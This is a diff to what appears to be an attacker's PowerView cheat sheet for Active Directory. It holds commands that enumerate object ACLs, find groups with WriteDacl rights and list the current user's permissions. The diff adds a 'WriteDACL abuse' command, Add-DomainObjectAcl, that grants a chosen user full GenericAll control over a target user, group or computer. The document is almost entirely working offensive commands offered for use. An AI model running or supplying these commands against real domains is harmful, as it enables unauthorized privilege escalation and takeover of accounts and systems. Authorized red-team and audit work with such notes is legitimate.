@@ -7,8 +7,12 @@ Get-DomainComputer -Properties DnsHostName
 # object permissions
 Get-ObjectAcl -Identity <user> -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Sort-Object Identity | Format-Table Identity, AceType, ActiveDirectoryRights -Wrap
 
-# WriteDACL for domain group
+# enumerate WriteDACL for domain group
 Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.ActiveDirectoryRights -like "*WriteDacl*") {$_}} | Format-Table Identity, ObjectDN, AceType, ActiveDirectoryRights -Wrap
+
+# WriteDACL abuse give GenericAll to AD object
+; <DOMAIN_USER> will have generic all access to <OBJECT> e.g. User/Group/Computer
+Add-DomainObjectAcl -TargetIdentity <OBJECT> -PrincipalIdentity <DOMAIN_USER> -Rights All
 
 # permissions for current user
 Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}} | Format-Table Identity, ObjectDN, AceType, ActiveDirectoryRights -Wrap
